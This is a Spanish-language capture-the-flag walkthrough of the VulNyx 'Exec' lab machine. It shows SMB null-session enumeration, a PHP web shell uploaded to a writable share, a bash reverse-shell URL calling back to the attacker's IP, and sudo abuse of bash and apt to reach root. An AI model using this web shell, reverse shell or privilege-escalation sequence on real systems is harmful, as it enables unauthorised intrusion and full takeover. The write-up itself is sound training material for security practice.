---
layout: default
title: Exec
parent: VulNyx
grand_parent: Writeups
---

# Exec
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

- SMB Enumeration (RW permission)
- RCE via PHP web shell
- Abusing sudoers binaries (bash, apt)
- User pivoting

## Enumeracion

Iniciamos con un escaneo de nmap donde encontraremos los puertos 22(SSH), 80(HTTP), y 139/455(netbios-SMB):

```bash
nmap -sS -n -Pn --open -p- 172.16.0.5
```

- sS: haga un TCP SYN Scan el cual hace un escaneo sigiloso sin completar las conexiones TCP, responde con un SYN/ACK si el puerto esta abierto

- n: para que no haga resolucion DNS y tarde menos el escaneo

- Pn: para evitar el descubrimiento de hosts

- open: para que solo muestre los puertos abiertos

- -p-: para que escanee todo el rango de puertos

```bash
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Ahora escanearemos para encontrar mas informacion sobre los puertos y servicios que estan corriendo

```bash
nmap -sCV -p22,80,139,445 172.16.0.5
```

- sCV: Lanza script para enumerar el servicio y obtiene informacion sobre la version del servicio

```bash

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: EXEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-06-24T23:16:21
|_  start_date: N/A
|_clock-skew: -2s
```

> En el puerto 80 no encontraremos mas que el sitio web por defecto de apache

### SMB - 445

Relizamos una enumeracion basica usando ```smbmap``` usando null session para saber cuales son los recursosc compartidos y sus permisos.

```bash
smbmap -H 172.16.0.5 -u "null" -p "null" --no-banner
```

Veremos que tenemos permisos RW sobre el recurso ```server```.

```bash
server 			READ, WRITE				Developer Directory
```

Ahora ingresaremos en el usando smbclient aplicando null session y nos daremos cuenta que existe el archivo ```index.html```:

```bash
smbclient //172.16.0.5/server -N
``` 
```bash
smb: \> ls
  .                                   D        0  Mon Apr 15 02:45:54 2024
  ..                                  D        0  Mon Apr 15 02:04:12 2024
  index.html                          N    10701  Mon Apr 15 02:04:31 2024

		19480400 blocks of size 1024. 16491120 blocks available
```

Si lo visualizamos es el mismo contenido que el del sitio web, por lo cual es muy probable que esten sincronizados, eso lo comprobamos si subimos un archivo usando el comando ```put```

```bash
smb: \> put archivo.txt
putting file archivo.txt as \archivo.txt (3.1 kb/s) (average 3.1 kb/s)
```

Ahora al ingresar al sitio web y apuntar a ese recurso veremos el contenido del archivo:

![](/assets/img/nyx-exec/1.png)

En este punto simplemente podemos subir una web shell usando PHP, en mi caso usare esta:

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Ahora solo apunteros al recurso pero indicando una reverse shell en el parametro ```cmd```

```bash
http://172.16.0.5/webshell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/<tu-ip>/443%200%3E%261%22
```
```bash
sudo nc -nlvp 443                                                                                                                                 ✘ 1
Connection from 172.16.0.5:55866
bash: cannot set terminal process group (484): Inappropriate ioctl for device
bash: no job control in this shell
www-data@exec:/var/www/html$ 
```

## User-pivoting: www-data -> s3cur4

Si mostramos los permisos a nivel de sudoers veremos que podemos ejecutar bash sin contraseña como el usuario ```s3cur4```:

```bash
Matching Defaults entries for www-data on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash
```

Ahora ejecutamos bash como el usuario s3cur4 usando el comando:

```bash
sudo -u s3cur4 /usr/bin/bash 
```

## Escalada de privilegios

Al mostrar de nuevo los permisos a nivel de sudoers, veremos que podemos ejecutar ```apt``` como root sin contraseña

```bash
Matching Defaults entries for s3cur4 on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```

Si buscamos en GFTOBins veremos que nos podemos hacer root de esta forma:

```bash
sudo apt changelog apt
!/bin/bash
```

Que en nuestro caso seria asi:

```bash
sudo -u root /usr/bin/apt changelog apt
```

Y despues ejecutar ```!/bin/bash```

Esto nos spawneara una shell y como root

```bash
root@exec:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Eso ha sido todo, gracias por leer
